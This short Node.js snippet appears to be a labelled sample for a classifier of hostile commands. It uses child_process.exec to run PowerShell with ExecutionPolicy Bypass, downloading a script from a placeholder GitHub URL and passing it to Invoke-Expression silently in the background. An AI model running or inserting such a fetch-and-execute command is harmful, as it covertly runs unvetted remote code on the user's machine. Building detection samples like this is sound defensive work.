const { exec } = require('child_process');

// No terminal is ever shown: the fetched script runs silently in the
// background, which keeps the hostile fetch-execute verdict.
exec('powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/example/helper/main/install.ps1 -UseBasicParsing | Invoke-Expression"');
